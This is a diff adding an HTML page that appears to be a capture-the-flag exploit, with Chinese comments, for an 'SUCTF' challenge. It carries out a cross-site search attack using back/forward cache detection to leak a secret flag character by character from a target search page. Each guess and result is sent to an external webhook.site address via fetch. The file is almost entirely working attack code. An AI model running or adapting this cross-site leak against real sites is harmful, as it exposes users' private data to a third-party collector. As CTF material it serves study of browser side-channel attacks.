@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>BFCache XS-Search (No-Popup Ver)</title>
+</head>
+<body>
+    <h2 id="status">正在准备攻击...</h2>
+    <p>请观察 Webhook 日志，Flag 会逐位跳出。</p>
+
+    <script>
+        // ================= 配置区域 =================
+        const TARGET_BASE = "http://127.0.0.1/search.php?q=";
+        // 【已修正】最后补上了缺失的 f
+        const WEBHOOK = "https://webhook.site/c8c16a87-5b68-43f5-8b20-57cb7cd2ba7f"; 
+        // ============================================
+
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
+        
+        // 1. 发送日志的函数
+        function sendLog(msg) {
+            fetch(`${WEBHOOK}?msg=${encodeURIComponent(msg)}`, { mode: 'no-cors' });
+        }
+
+        // 2. 利用 localStorage 存储攻击进度 (因为页面会刷新)
+        let currentFlag = localStorage.getItem('ctf_flag') || "SUCTF{";
+        let charIndex = parseInt(localStorage.getItem('ctf_char_index') || "0");
+        const charset = ['0', '1', '}'];
+
+        // 3. 核心探测逻辑：监控 pageshow 事件
+        window.addEventListener('pageshow', async (event) => {
+            // 如果 event.persisted 为 true，说明页面是从 BFCache 中瞬间恢复的
+            // 根据题目逻辑：命中(Hit) -> 无 unload 事件 -> 触发 BFCache
+            if (event.persisted) {
+                let hitChar = charset[charIndex];
+                sendLog(`[+] 判定成功! 这一位是: ${hitChar} (由于 BFCache 命中)`);
+                
+                if (hitChar === '}') {
+                    sendLog(`[!] 大功告成! 最终 Flag: ${currentFlag}${hitChar}`);
+                    localStorage.clear();
+                    return;
+                }
+
+                // 更新 Flag，重置字符索引，继续下一位
+                currentFlag += hitChar;
+                localStorage.setItem('ctf_flag', currentFlag);
+                localStorage.setItem('ctf_char_index', "0");
+                
+                await sleep(500);
+                startNextTest();
+            } else {
+                // 第一次加载或者 BFCache 未命中
+                if (localStorage.getItem('is_testing') === 'true') {
+                    sendLog(`[-] 判定失败: ${currentFlag}${charset[charIndex]} (由于页面重新加载)`);
+                    
+                    // 测试下一个字符
+                    charIndex++;
+                    if (charIndex >= charset.length) {
+                        sendLog(`[!] 错误: 0 和 1 都没匹配上，请检查题目环境。`);
+                        return;
+                    }
+                    localStorage.setItem('ctf_char_index', charIndex.toString());
+                    startNextTest();
+                } else {
+                    // 初始启动
+                    sendLog(`[START] 脚本已启动，当前 Flag 进度: ${currentFlag}`);
+                    startNextTest();
+                }
+            }
+        });
+
+        function startNextTest() {
+            let guess = currentFlag + charset[charIndex];
+            document.getElementById('status').innerText = `正在测试: ${guess}`;
+            localStorage.setItem('is_testing', 'true');
+            
+            sendLog(`[*] 正在跳转搜索: ${guess}`);
+            
+            // 延迟一小会儿确保日志发出，然后跳转
+            setTimeout(() => {
+                // 跳转到目标搜索页面。题目自带 5s 后 history.back()，我们会自动跳回来
+                location.href = TARGET_BASE + encodeURIComponent(guess);
+            }, 500);
+        }
+    </script>
+</body>
+</html>
